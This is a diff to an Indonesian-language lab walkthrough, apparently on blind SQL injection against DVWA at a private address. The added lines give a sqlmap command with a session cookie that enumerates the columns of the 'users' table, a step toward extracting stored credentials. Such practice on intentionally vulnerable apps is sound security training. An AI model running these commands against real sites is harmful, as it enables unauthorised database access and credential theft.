@@ -40,6 +40,14 @@ sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Su
 nah disana terdapat 2 tables yaitu <b><i> guestbook dan users </i></b>
 
 ![Screenshot (469)](https://user-images.githubusercontent.com/118157585/216914534-a11d21ed-488b-4cc2-964c-80d04f2316c6.png)
+
+lalu sekarang kita lanjut untuk mencari columns nya dari tables kedua tersebut, tapi saya feeling columns yang penting berada di tables <b><i> users </i></b>.
+jadi kita crack di tables <b><i> users </i></b> dengan menggunakan perintah :
+
+```
+sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=gg58gd3lp0rqeq3rftt96l1b3kq' -T users --columns
+```
+
 ![Screenshot (470)](https://user-images.githubusercontent.com/118157585/216914627-66c0f0cc-8238-4fb1-9e14-3a5366b64288.png)
 ![Screenshot (471)](https://user-images.githubusercontent.com/118157585/216914738-07273ce5-2666-4607-89a5-e8390b9aa9c0.png)
 ![Screenshot (472)](https://user-images.githubusercontent.com/118157585/216914855-fea2c425-2fe1-4fad-8929-a3d3e1584747.png)
